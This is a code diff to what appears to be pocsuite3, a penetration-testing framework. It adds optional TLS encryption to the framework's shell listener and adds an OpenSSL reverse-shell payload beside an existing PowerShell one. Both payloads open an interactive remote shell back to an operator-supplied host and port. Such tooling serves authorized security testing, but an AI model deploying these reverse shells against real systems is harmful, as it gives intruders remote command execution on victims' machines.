@@ -2,9 +2,10 @@ import select
 import socket
 import threading
 import time
-
+import os
+from pocsuite3.lib.utils import gen_cert
 from pocsuite3.lib.core.common import data_to_stdout, has_poll, get_unicode, desensitization
-from pocsuite3.lib.core.data import conf, kb, logger
+from pocsuite3.lib.core.data import conf, kb, logger, paths
 from pocsuite3.lib.core.datatype import AttribDict
 from pocsuite3.lib.core.enums import AUTOCOMPLETE_TYPE, OS, CUSTOM_LOGGING
 from pocsuite3.lib.core.exception import PocsuiteShellQuitException
@@ -27,6 +28,15 @@ def get_sock_listener(listen_port, listen_host="0.0.0.0", ipv6=False, protocol=N
         s = socket.socket(socket.AF_INET, protocol)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
+    msg = ''
+    if conf.enable_tls_listener and protocol == socket.SOCK_STREAM:
+        import ssl
+        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+        cert_path = os.path.join(paths.POCSUITE_DATA_PATH, 'cacert.pem')
+        gen_cert(filepath=cert_path)
+        context.load_cert_chain(cert_path)
+        s = context.wrap_socket(s, server_side=True)
+        msg = 'TLS '
     try:
         s.bind((listen_host, listen_port))
     except socket.error:
@@ -36,7 +46,7 @@ def get_sock_listener(listen_port, listen_host="0.0.0.0", ipv6=False, protocol=N
         return None
 
     if protocol == socket.SOCK_STREAM:
-        msg = "listening on {0}:{1}".format(listen_host, listen_port)
+        msg += "listening on {0}:{1}".format(listen_host, listen_port)
         logger.log(CUSTOM_LOGGING.SYSINFO, msg)
         s.listen(5)
     return s
@@ -313,7 +323,7 @@ class REVERSE_PAYLOAD:
     p.waitFor()
     """
     POWERSHELL = """$client = New-Object System.Net.Sockets.TCPClient('{0}',{1});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"""
-
+    OPENSSL = """rm -rf /tmp/s;mkfifo /tmp/s;/bin/sh -i </tmp/s 2>&1|openssl s_client -quiet -connect {0}:{1}>/tmp/s;rm -rf /tmp/s"""
 
 
 if __name__ == "__main__":
